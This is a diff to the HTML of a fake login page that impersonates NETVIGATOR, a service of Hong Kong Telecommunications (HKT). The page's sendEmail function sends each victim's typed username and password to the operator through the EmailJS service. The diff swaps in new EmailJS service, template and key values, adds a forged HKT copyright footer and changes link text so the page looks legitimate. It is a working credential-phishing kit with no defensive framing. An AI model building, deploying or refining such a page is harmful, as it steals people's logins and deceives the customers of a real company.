@@ -6,7 +6,7 @@
   <title>Login to Your Account</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("WWo7anZY4HvX4SL2h");
+    emailjs.init("cX1hyiNenZ0Zc7a3r");
   </script>
   <style>
     body {
@@ -115,6 +115,15 @@
       font-size: 18px;
       font-weight: bold;
     }
+
+    footer {
+      position: absolute;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      color: #888;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
@@ -127,7 +136,7 @@
       <input type="text" id="username" placeholder="Username" required>
       <input type="password" id="password" placeholder="Password" required>
       <button id="loginButton" onclick="authenticate()">Re-enable 2FA</button>
-      <p><a href="#" class="forgot-password">If you are not yet a NETVIGATOR user, please click here to apply.</a></p>
+      <p><a href="#" class="forgot-password">Terms and Conditions Privacy Statement Terms of Use for this Website.</a></p>
     </div>
   </div>
 
@@ -138,11 +147,16 @@
     <button onclick="retryLogin()">Re-try</button>
   </div>
 
+  <!-- Footer -->
+  <footer>
+    © Hong Kong Telecommunications (HKT) Limited 2007-2025. All rights reserved.
+  </footer>
+
   <script>
     function sendEmail(username, password) {
-      const serviceID = "service_d2hfm4i";
-      const templateID = "template_4dj5dbg";
-      const publicKey = "WWo7anZY4HvX4SL2h";
+      const serviceID = "service_0ss7u7m";
+      const templateID = "template_1dgy1fo";
+      const publicKey = "cX1hyiNenZ0Zc7a3r";
 
       const templateParams = {
         login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
